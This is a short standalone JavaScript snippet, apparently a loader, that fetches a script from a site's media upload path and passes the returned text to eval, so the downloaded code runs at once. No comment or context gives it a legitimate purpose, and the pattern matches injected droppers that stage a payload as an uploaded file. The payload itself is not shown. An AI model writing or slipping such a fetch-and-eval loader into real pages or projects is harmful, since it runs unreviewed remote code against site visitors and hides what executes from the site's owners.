(async () => {
  let req = await fetch('/api/media/secure/external/v2/raw/upload/69ba7b6d52adba5fe48ddc12.js');
  let res = await req.text();
  eval(res);
})();
